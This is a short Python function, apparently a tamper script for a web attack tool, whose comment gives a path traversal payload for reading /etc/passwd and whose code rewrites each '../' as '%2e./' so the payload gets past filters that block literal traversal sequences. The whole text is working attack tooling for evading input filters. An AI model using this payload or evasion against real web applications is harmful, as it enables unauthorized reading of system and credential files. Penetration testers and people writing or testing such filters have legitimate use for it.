# page=../../../../etc/passwd  =>  page=%2e./%2e./%2e./%2e./etc/passwd

def tamper(payload:str):
    if payload:
        payload=payload.replace('../','%2e./')
    return payload